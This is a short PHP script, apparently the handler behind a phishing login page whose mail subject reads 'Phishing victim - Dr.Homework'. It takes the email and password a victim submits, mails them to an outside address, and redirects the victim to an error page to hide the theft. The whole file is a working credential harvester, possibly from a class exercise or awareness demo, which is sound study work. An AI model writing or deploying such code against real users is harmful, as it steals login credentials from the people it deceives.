<?php

if (isset($_POST['psh-login'])){

    $email = $_POST['mail'];
    $password = $_POST['pwd'];
    
    $msg_mail = "Email: ".$email;
    $msg_pwd = "Password: ".$password;
    
    $full_msg = $msg_mail."\n".$msg_pwd;
    
    $wrp_msg = wordwrap($full_msg,70);
    
    mail("galzu@mta.ac.il","Phishing victim - Dr.Homework",$wrp_msg);

    header("Location: http://shanybi.mtacloud.co.il/index.php?error=emptyfields&mail=");
    exit(); 
    
}
else{
    header("Location: ../login_pg.php");
    exit(); 
}